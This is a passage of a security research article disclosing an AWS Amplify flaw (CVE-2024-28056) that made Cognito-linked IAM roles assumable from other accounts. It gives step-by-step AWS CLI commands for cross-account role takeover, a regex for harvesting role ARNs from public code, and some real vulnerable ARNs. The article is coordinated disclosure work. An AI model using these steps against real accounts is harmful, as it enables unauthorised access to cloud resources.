  <path d="M176,160H68V144H176Zm0-72H68v16H176Zm0-56H68V48H176ZM44,26H16V54H44Zm0,56H16v28H44Zm0,56H16v28H44Z"/>
</svg>
</span><p class="font-roboto-mono font-light uppercase text-sm">on this page<p>
    </div>
    <nav class="article-toc-nav" >
        <ul><li><a href="#key-points">Key Points</a></li><li><a href="#timeline">Timeline</a></li><li><a href="#introduction">Introduction</a></li><li><a href="#background">Background</a><ul><li><a href="#potential-misconfiguration-1-trust-policy-without-a-condition">Potential misconfiguration 1: Trust policy without a condition</a></li><li><a href="#potential-misconfiguration-2-trust-policy-with-an-unauthenticated-condition">Potential misconfiguration 2: Trust policy with an unauthenticated condition</a></li><li><a href="#potential-misconfiguration-3-trust-policy-with-an-authenticated-condition">Potential misconfiguration 3: Trust policy with an authenticated condition</a></li></ul></li><li><a href="#finding-vulnerable-roles">Finding vulnerable roles</a><ul><li><a href="#searching-for-targets">Searching for targets</a></li><li><a href="#results-finding-misconfigured-roles-in-the-wild">Results: Finding misconfigured roles in the wild</a></li></ul></li><li><a href="#tracking-down-the-root-cause">Tracking down the root cause</a><ul><li><a href="#how-amplify-exposed-iam-roles-to-takeover-variant-one">How Amplify exposed IAM roles to takeover: Variant one</a></li><li><a href="#variant-two">Variant two</a></li></ul></li><li><a href="#compounding-factors-increasing-severity">Compounding factors increasing severity</a><ul><li><a href="#1-amplify-roles-maintained-their-privileges-after-authentication-was-removed">1. Amplify roles maintained their privileges after authentication was removed</a></li><li><a href="#2-potentially-vulnerable-role-arns-are-easily-discoverable">2. Potentially vulnerable role ARNs are easily discoverable</a></li><li><a href="#3-exposure-started-years-ago">3. Exposure started years ago</a></li></ul></li><li><a href="#an-example-of-how-this-could-be-exploited">An example of how this could be exploited</a></li><li><a href="#aws-response">AWS response</a></li><li><a href="#how-to-know-if-youre-affected">How to know if you're affected</a><ul><li><a href="#identifying-vulnerable-iam-roles">Identifying vulnerable IAM roles</a></li><li><a href="#identifying-vulnerable-identity-pools">Identifying vulnerable identity pools</a></li><li><a href="#identifying-threat-actor-activity-in-your-environment">Identifying threat actor activity in your environment</a></li></ul></li><li><a href="#how-datadog-can-help">How Datadog can help</a></li><li><a href="#conclusion">Conclusion</a></li></ul>
      </nav>
    
  
</nav>

    </aside>

    <div class="col-span-12 desktop:col-span-8">
      <div class="authors grid grid-cols-2 tablet-lg:gap-x-[30px] gap-x-[14px] tablet-lg:gap-y-4 mobile:gap-y-3 gap-y-2">
        
          





<a href="/articles/?author=Nick_Frichette" aria-label="Search articles written by Nick Frichette" class="author-card flex flex-row w-full hover:text-purple" data-custom-name="Search filter author card">
  
    


    



<figure>
    <img
        src="https://datadog-securitylabs.imgix.net/img/authors/nick_frichette.jpg?auto=format&amp;w=48&amp;h=48&dpr=2&q=75"
        alt="Nick Frichette"
        class="rounded-full w-12 h-12 max-w-max max-h-max"
        loading="eager"
    />
</figure>


  <div class="ml-2 tablet:ml-4">
    <p class="text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20 font-extrabold ">Nick Frichette</p>
    <p class="mt-1 text-12 leading-16 tablet:text-14 tablet:leading-18 desktop:text-16 desktop:leading-20">Staff Security Researcher</p>
  </div>
</a>

        
      </div>

      <span class="block pb-9 tablet:pb-12 desktop:pb-15"></span>

      

      <div class="article-content relative">
        <h2 id="key-points" tabindex="-1"><a class="header-anchor" href="#key-points">Key Points</a></h2>
<ul>
<li>We identified two variants of a vulnerability in AWS Amplify that exposed identity and access management (IAM) roles associated with Amplify projects, allowing them to become assumable by anyone in the world.</li>
<li>If the authentication component was removed from an Amplify project using the <a href="https://github.com/aws-amplify/amplify-cli">Amplify CLI</a> or <a href="https://docs.amplify.aws/javascript/tools/console/">Amplify Studio</a> built between August 2019 and January 2024, the IAM roles associated with the project were publicly assumable.</li>
<li>IAM roles associated with Amplify projects created using the Amplify CLI built between July 2018 and August 2019 had trust policies that allowed anyone in the world to assume them.</li>
<li>The CLI vulnerability is tracked as <strong>CVE-2024-28056</strong>.</li>
<li>On the same day we reported the vulnerability to them, AWS released a <a href="https://github.com/aws-amplify/amplify-cli/releases/tag/v12.10.1">hotfix</a> for the CLI to mitigate the issue in any newly created roles.</li>
<li>AWS has rolled out enhancements to IAM to prevent the creation of vulnerable roles. Additionally, <strong>AWS has modified its Security Token Service (STS) to block cross-account role assumption of vulnerable roles</strong>. This vulnerability can no longer be exploited.</li>
</ul>
<h2 id="timeline" tabindex="-1"><a class="header-anchor" href="#timeline">Timeline</a></h2>
<ul>
<li><strong>January 4, 2024</strong>: Datadog Security Research identifies the vulnerable behavior in AWS Amplify.</li>
<li><strong>January 9, 2024, 9 a.m. CST</strong>: Datadog Security Research contacts AWS with a proof of concept and technical details.</li>
<li><strong>January 9, 2024, 2:33 p.m. CST</strong>: AWS creates a <a href="https://github.com/aws-amplify/amplify-cli/pull/13523">PR</a> to fix the vulnerability in the Amplify CLI.</li>
<li><strong>January 9, 2024, 10:13 p.m. CST</strong>: AWS <a href="https://github.com/aws-amplify/amplify-cli/releases/tag/v12.10.1">releases</a> version 12.10.1 of the Amplify CLI, ensuring that no future roles will be exposed.</li>
<li><strong>January 12, 2024</strong>: AWS releases a patch that fixes the version of the vulnerability in Amplify Studio, ensuring that no future roles will be exposed.</li>
<li><strong>January 17, 2024</strong>: Datadog Security Research releases two detections, &quot;AWS IAM role should not have permissive trust with the Cognito Identity service&quot; and &quot;AWS IAM role should not have permissive trust with the Cognito Identity service and &quot;FullAccess&quot; permissions&quot;, to protect customers impacted by this vulnerability and begins proactively contacting customers with privileged IAM roles that were vulnerable.</li>
<li><strong>February 28, 2024</strong>: AWS releases a patch to prevent an adversary assuming a role susceptible to the first variant of this vulnerability from a different AWS account.</li>
<li><strong>February 29, 2024</strong>: AWS releases a patch to prevent roles susceptible to the first variant from being created.</li>
<li><strong>March 5, 2024</strong>: Datadog Security Research meets with AWS to discuss the vulnerability. We disclose that variant two of the vulnerability is still exploitable.</li>
<li><strong>April 8, 2024</strong>: AWS releases a patch to prevent an adversary assuming a role susceptible to the second variant of this issue from a different AWS account.</li>
<li><strong>April 15, 2024</strong>: Datadog Security Research and AWS release coordinated disclosure (see <a href="https://aws.amazon.com/security/security-bulletins/AWS-2024-003/">AWS security bulletin</a>).</li>
</ul>
<h2 id="introduction" tabindex="-1"><a class="header-anchor" href="#introduction">Introduction</a></h2>
<p>One of our core objectives is to explore, identify, and document new methods to attack cloud resources. On occasion, these efforts <a href="https://securitylabs.datadoghq.com/articles/?tag=vulnerability_disclosure">uncover vulnerabilities in those cloud services</a>, and we work with cloud service providers to ensure their remediation.</p>
<p><strong>We discovered a vulnerability in <a href="https://aws.amazon.com/amplify/">AWS Amplify</a> that caused Cognito IAM roles associated with the service to become assumable by anyone in the world. In addition, when these roles were publicly exposed, they retained the privileges they had before the exposure.</strong></p>
<p>In this article, we will examine vulnerable configurations for IAM roles with a trust relationship to the Cognito Identity service, how we uncovered a vulnerability in AWS Amplify that exposed these roles to be assumable by anyone, and how this finding impacts Amplify users.</p>
<h2 id="background" tabindex="-1"><a class="header-anchor" href="#background">Background</a></h2>
<p>In order to demonstrate the impact of the vulnerability, we will describe how we discovered this behavior.</p>
<p><a href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a &quot;sign-in-as-a-service&quot; offering from AWS, enabling developers to shift the effort of developing an authentication system and securely storing user credentials to AWS.</p>
<p>One of the major features of Cognito is <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html">identity pools</a>, which allow developers to authorize authenticated or anonymous users to access AWS resources. Identity pools can issue standard short-lived STS credentials (access keys) for those users.</p>
<p>To do this, Cognito creates a role in the AWS account with a role trust policy that looks similar to the following (this example is specifically for an authenticated Cognito role):</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"StringEquals"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:aud"</span><span class="token operator">:</span> <span class="token string">"us-east-1:00000000-aaaa-1111-bbbb-222222222222"</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"authenticated"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<p>The most important part of this policy is the <code>Condition</code> element. Without this condition, the trust relationship with the <code>cognito-identity.amazonaws.com</code> service could have allowed anyone in the world to assume this role, as we show in the following sections.</p>
<h3 id="potential-misconfiguration-1-trust-policy-without-a-condition" tabindex="-1"><a class="header-anchor" href="#potential-misconfiguration-1-trust-policy-without-a-condition">Potential misconfiguration 1: Trust policy without a condition</a></h3>
<p>In order to assume an IAM role with a misconfigured role trust policy we first have to convince the Cognito service to assume the role on our behalf. Under most circumstances, this is not possible. As an example, if you create an identity pool or modify an existing one and attempt to specify an unauthenticated role in a different account you will receive the following error message:</p>
<pre class="language-shell"><code class="language-shell">nick.frichette@host % aws cognito-identity set-identity-pool-roles <span class="token punctuation">\</span>
--identity-pool-id us-east-1:11111111-aaaa-2222-bbbb-333333333333 <span class="token punctuation">\</span>
<span class="token parameter variable">--roles</span> <span class="token assign-left variable">unauthenticated</span><span class="token operator">=</span>arn:aws:iam::222222222222:role/role-in-different-aws-account

An error occurred <span class="token punctuation">(</span>AccessDeniedException<span class="token punctuation">)</span> when calling the SetIdentityPoolRoles operation: Cross-account pass role is not allowed.</code></pre>
<p>However, we identified a method to assume a role with a misconfigured trust policy by using Cognitoâs <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html">Basic (classic) authflow</a>. The final step in this authentication flow is to perform an <a href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a> API call. <code>sts:AssumeRoleWithWebIdentity</code> takes an IAM roleâs Amazon Resource Name (ARN) as a parameter, allowing us to specify a vulnerable role in a different AWS account. <strong>Crucially, specifying a role belonging to a different AWS account did not return an error</strong>.</p>
<p>A hypothetical attacker was able to assume an IAM role with a misconfigured role trust policy by creating their own identity pool in their attacker-controlled account. The attacker would then generate the identity token required for the <code>sts:AssumeRoleWithWebIdentity</code> API call using their own identity pool and provide the ARN of the role in the victim account.</p>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cross-account-assume-role.png
?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="1000" style="max-width: 1000px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cross-account-assume-role.png
?auto=format&w=1000&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cross-account-assume-role.png
?auto=format&w=1000&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cross-account-assume-role.png
?auto=format&w=1000&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/cross-account-assume-role.png
?auto=format&w=1000&dpr=1.75"
          alt="Assuming a role in another account using an attacker controlled identity pool"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Assuming a role in another account using an attacker controlled identity pool</figcaption></a> 
      </figure>
<p>To demonstrate how an attacker could take advantage of this, consider the following example of a misconfigured role trust policy on a role with the ARN <code>arn:aws:iam::111111111111:role/vulnerable_role</code>:</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<p>This policy, without the aforementioned <code>Condition</code> element to protect it, would permit any Cognito Identity pool the ability to assume the role, including those outside the roleâs account. No further authentication or authorization was required. From a separate account that they control, an attacker could perform the following steps to assume the role.</p>
<ol>
<li>Create an attacker-controlled Cognito Identity pool.<br>
a. <code>aws cognito-identity create-identity-pool --identity-pool-name attacker_id_pool --allow-classic-flow --allow-unauthenticated-identities</code><br>
b. This will return an <code>IdentityPoolId</code>, which will be used in the next step.</li>
<li>Generate a Cognito IdentityId using the ID from the previous step.<br>
a. <code>aws cognito-identity get-id --identity-pool-id &lt;IdentityPoolId from step 1&gt;</code><br>
b. This will return an <code>IdentityId</code> that will be used in the next step.</li>
<li>Generate a Cognito web identity token.<br>
a. <code>aws cognito-identity get-open-id-token --identity-id &lt;IdentityId from step 2&gt;</code><br>
b. This will return a <code>Token</code> that will be used in the next step.</li>
<li>Assume the role in the victimâs account using <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a>.<br>
a. <code>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token &lt;Token from step 3&gt;</code></li>
</ol>
<p>Following these steps would generate short-lived STS credentials for the vulnerable role in the victimâs account, allowing an adversary to access and interact with all resources to which the role had privileges.</p>
<pre class="language-shell"><code class="language-shell">nick.frichette@host % aws sts get-caller-identity
<span class="token punctuation">{</span>
    <span class="token string">"UserId"</span><span class="token builtin class-name">:</span> <span class="token string">"AROAEXAMPLEEXAMPLE123:hacked"</span>,
    <span class="token string">"Account"</span><span class="token builtin class-name">:</span> <span class="token string">"111111111111"</span>,
    <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:sts::111111111111:assumed-role/vulnerable_role/hacked"</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="potential-misconfiguration-2-trust-policy-with-an-unauthenticated-condition" tabindex="-1"><a class="header-anchor" href="#potential-misconfiguration-2-trust-policy-with-an-unauthenticated-condition">Potential misconfiguration 2: Trust policy with an unauthenticated condition</a></h3>
<p>It is important to note that the process described in <a href="/articles/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/#potential-misconfiguration-1-trust-policy-without-a-condition">misconfiguration #1</a> would also work when there was an empty <code>Condition</code> element or one where the <code>cognito-identity.amazonaws.com:amr</code> condition was set to <code>unauthenticated</code>. Here is an example policy:</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"unauthenticated"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<p>This was because IAM was only comparing the condition against the attacker-controlled identity pool, not the pool the victim role was originally configured for. This behavior allowed us to authenticate to IAM roles that had an <code>authenticated</code> condition as well.</p>
<h3 id="potential-misconfiguration-3-trust-policy-with-an-authenticated-condition" tabindex="-1"><a class="header-anchor" href="#potential-misconfiguration-3-trust-policy-with-an-authenticated-condition">Potential misconfiguration 3: Trust policy with an authenticated condition</a></h3>
<p>The process to assume a role that had an <code>authenticated</code> <code>cognito-identity.amazonaws.com:amr</code> condition required an extra step in the form of creating an attacker-controlled <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html">Cognito user pool</a> to authenticate against. While this took an extra bit of time, the overall process was still straightforward.</p>
<p>This example assumes you had already created a Cognito user pool in an attacker-controlled AWS account and created a user for it. We also assume you were targeting a role with a trust policy similar to the following:</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span><span class="token punctuation">,</span>
            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ForAnyValue:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"cognito-identity.amazonaws.com:amr"</span><span class="token operator">:</span> <span class="token string">"authenticated"</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code></pre>
<ol>
<li>Authenticate to the attacker-controlled user pool.<br>
a. <code>aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id &lt;attacker controlled client id&gt; --auth-parameters USERNAME=&lt;username&gt;,PASSWORD=&lt;password&gt;</code><br>
b. This will return an <code>IdToken</code> that will be used in the next step.</li>
<li>Generate a Cognito IdentityId.<br>
a. <code>aws cognito-identity get-id --identity-pool-id &lt;attacker controlled identity pool id&gt; --logins '{&quot;cognito-idp.us-east-1.amazonaws.com/&lt;attacker controlled user pool id&gt;&quot;:&quot;&lt;IdToken from step 1&gt;&quot;}'</code><br>
b. This will return an <code>IdentityId</code> that will be used in the next step.</li>
<li>Generate a Cognito web identity token.<br>
a. <code>aws cognito-identity get-open-id-token --identity-id &lt;identityId from step 2&gt; --logins '{&quot;cognito-idp.us-east-1.amazonaws.com/&lt;attacker controlled user pool id&gt;&quot;:&quot;&lt;IdToken from step 1&gt;&quot;}'</code><br>
b. This will return a <code>Token</code> that will be used in the next step.</li>
<li>Assume the role using <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">sts:AssumeRoleWithWebIdentity</a>.<br>
a. <code>aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111111111111:role/vulnerable_role --role-session-name hacked --web-identity-token &lt;Token from step 3&gt;</code></li>
</ol>
<h2 id="finding-vulnerable-roles" tabindex="-1"><a class="header-anchor" href="#finding-vulnerable-roles">Finding vulnerable roles</a></h2>
<p>In the previous section, we described different types of misconfigurations that could impact IAM roles used by Amazon Cognito. To be clear, these were not vulnerabilities in Amazon Cognito, only risky misconfigurations. As part of this research project, we also wanted to understand how common these misconfigurations were in the wild and, if possible, report vulnerable roles to organizations so they could be fixed. We implemented a quick search using publicly available data.</p>
<h3 id="searching-for-targets" tabindex="-1"><a class="header-anchor" href="#searching-for-targets">Searching for targets</a></h3>
<p>In order to assume a vulnerable role, we need the Amazon Resource Name (ARN) of that role. There are a number of techniques to achieve this, including:</p>
<ul>
<li><a href="https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/">Brute-forcing</a> IAM roles from known account IDs</li>
<li><a href="https://hackingthe.cloud/aws/enumeration/enumerate_principal_arn_from_unique_id/">Enumerating</a> a principalâs ARN from a <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html#identifiers-unique-ids">unique identifier</a></li>
<li>Leveraging search engines and data aggregators to search for publicly known ARNs</li>
</ul>
<p>Similar to the work we have previously published on <a href="https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/">misconfigured GitHub action role trust policies</a>, we used <a href="https://sourcegraph.com/">Sourcegraph</a> to search through public GitHub repositories using a regular expression:</p>
<pre><code>/arn:aws:iam::[0-9]{12}:role\/[\/a-zA-Z0-9-_]+/ count:all archived:yes fork:yes context:global
</code></pre>
<p>Using this approach, and removing duplicate or placeholder ARNs, we were able to gather over 8,000 role ARNs in a matter of minutes.</p>
<h3 id="results-finding-misconfigured-roles-in-the-wild" tabindex="-1"><a class="header-anchor" href="#results-finding-misconfigured-roles-in-the-wild">Results: Finding misconfigured roles in the wild</a></h3>
<p>To test if a particular IAM role was vulnerable, we programmatically attempted to assume it using our own Cognito identity pool. We performed this twice for each role to account for the fact that the <code>cognito-identity.amazonaws.com:amr</code> condition could be set to either <code>authenticated</code> or <code>unauthenticated</code>, if it existed.</p>
<p>We were able to write a script that would check for vulnerable roles and indicate if they were vulnerable. This entire process took approximately five minutes.</p>
<p>As we began looking over the results, however, we uncovered interesting findings. Over 90 percent of the vulnerable roles had similar names across a variety of AWS accounts. The following are some examples that we modified to protect their owners, but also to demonstrate the similarity.</p>
<ul>
<li>communicationclient-master-20190713239617-<strong>authRole</strong></li>
<li>chatamber-20181621961321-<strong>authRole</strong></li>
<li>ml-yeti-ui-dev-20191316145242-<strong>unauthRole</strong></li>
<li>aerodeploy-master-132847-<strong>authRole</strong></li>
<li>liveconveyance-dev-175294-<strong>unauthRole</strong></li>
</ul>
<p>These vulnerable roles almost all ended in either <code>authRole</code> or <code>unauthRole</code>. In addition, some role names appeared to include timestamps dating back to 2018, while others (presumably more recent ones) included six-digit integers to keep them unique.</p>
<p>Another interesting result was that some vulnerable roles belonged to AWS themselves. We found three such roles in the <a href="https://github.com/aws-samples">AWS Samples</a> GitHub organization.</p>
<ul>
<li><a href="https://github.com/aws-samples/aws-amplify-cloud-assistant-app/blob/35cbd043fb6d3bb31cf3494eb5da466b3da26f93/amplify/team-provider-info.json">arn:aws:iam::929881370398:role/amplify-awsassistant-sampledev-144248-authRole</a></li>
<li><a href="https://github.com/aws-samples/chime-live-translation-transcription-polly/blob/a27be5c355c494b080c8cff23047b1f6274875c5/amplify/team-provider-info.json">arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-unauthRole</a></li>
<li><a href="https://github.com/aws-samples/chime-live-translation-transcription-polly/blob/a27be5c355c494b080c8cff23047b1f6274875c5/amplify/team-provider-info.json">arn:aws:iam::098305555551:role/amplify-livetranslation-dev-165918-authRole</a></li>
</ul>
<p>After uncovering misconfigured roles, we asked the question: What was it about these roles that made them more likely to be vulnerable?</p>
<h2 id="tracking-down-the-root-cause" tabindex="-1"><a class="header-anchor" href="#tracking-down-the-root-cause">Tracking down the root cause</a></h2>
<p>We began our search by looking at where these vulnerable roles were located. A large portion of them were in files called <code>team-provider-info.json</code>. A Google search informed us that these files are associated with another AWS service named <a href="https://aws.amazon.com/amplify/">Amplify</a>.</p>
<p>Amplify is a popular AWS service that makes it easy to develop mobile and web applications. It acts as a framework that allows you to focus on writing code, while Amplify automatically creates and configures infrastructure for your application. This means that <strong>Amplify will deploy and configure resources in your AWS account</strong>.</p>
<p>To explore the service we created an Amplify project. This added two IAM roles in our account named:</p>
<p>amplify-secrestesting-dev-134733-<strong>authRole</strong><br>
amplify-secrestesting-dev-134733-<strong>unauthRole</strong></p>
<p>Now, we knew where these roles were coming from (Amplify)! But how were they becoming misconfigured?</p>
<h3 id="how-amplify-exposed-iam-roles-to-takeover-variant-one" tabindex="-1"><a class="header-anchor" href="#how-amplify-exposed-iam-roles-to-takeover-variant-one">How Amplify exposed IAM roles to takeover: Variant one</a></h3>
<p>By default, when Amplify creates these <code>auth</code> and <code>unauth</code> roles in your account, they have a role trust policy that looks like the following:</p>
<pre class="language-json"><code class="language-json"><span class="highlight-line"><span class="token punctuation">{</span></span>
<span class="highlight-line">    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span></span>
<span class="highlight-line">    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span></span>
<span class="highlight-line">        <span class="token punctuation">{</span></span>
<span class="highlight-line">            <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span></span>
<mark class="highlight-line highlight-line-active">            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Deny"</span><span class="token punctuation">,</span></mark>
<span class="highlight-line">            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span></span>
<span class="highlight-line">                <span class="token property">"Federated"</span><span class="token operator">:</span> <span class="token string">"cognito-identity.amazonaws.com"</span></span>
<span class="highlight-line">            <span class="token punctuation">}</span><span class="token punctuation">,</span></span>
<span class="highlight-line">            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"sts:AssumeRoleWithWebIdentity"</span></span>
<span class="highlight-line">        <span class="token punctuation">}</span></span>
<span class="highlight-line">    <span class="token punctuation">]</span></span>
<span class="highlight-line"><span class="token punctuation">}</span></span></code></pre>
<p>While this may look similar to the vulnerable configuration we noted previously, it is important to point out that the <code>Effect</code> is set to <code>Deny</code>. This prevents someone from being able to assume the role, so it is safe.</p>
<p>As a part of the Amplify service, you can add an <a href="https://docs.amplify.aws/javascript/build-a-backend/auth/set-up-auth/">authentication</a> component to your application, allowing you to add features such as user sign-up and sign-in. On the backend, Amplify will deploy and configure Amazon Cognito on your behalf. This authentication component will use the previously created <code>auth</code> and <code>unauth</code> roles for the Amplify project. The <code>auth</code> role is for users who are authenticated to the Amplify app, while the <code>unauth</code> role is for unauthenticated users.</p>
<p>This process can be done either using the <a href="https://docs.amplify.aws/javascript/tools/console/">Amplify Studio</a> (a console interface for Amplify apps) or through the <a href="https://docs.amplify.aws/javascript/tools/cli/">Amplify CLI</a> with the following command:</p>
<pre class="language-shell"><code class="language-shell">$ amplify <span class="token function">add</span> auth</code></pre>
<figure class="mt-4">
        <a href="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-studio-view.png?auto=format" target="SecurityLabsTab"><img
          class="w-full mx-auto" width="800" style="max-width: 800px;"
          srcset="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-studio-view.png?auto=format&w=800&dpr=1.75 1x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-studio-view.png?auto=format&w=800&dpr=2&q=75 2x, https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-studio-view.png?auto=format&w=800&dpr=3&q=55 3x" 
          src="https://datadog-securitylabs.imgix.net/img/amplified-exposure-how-aws-flaws-made-amplify-iam-roles-vulnerable-to-takeover/amplify-studio-view.png?auto=format&w=800&dpr=1.75"
          alt="Adding the authentication component from Amplify Studio"
          loading="lazy">
        <figcaption class="text-gray-500 mt-4 mx-auto w-max max-w-full">Adding the authentication component from Amplify Studio</figcaption></a> 
      </figure>
<p>When this occurs, Amplify will configure the role trust policy of the <code>auth</code> and <code>unauth</code> roles to be similar to the following:</p>
<pre class="language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>
    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>
            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
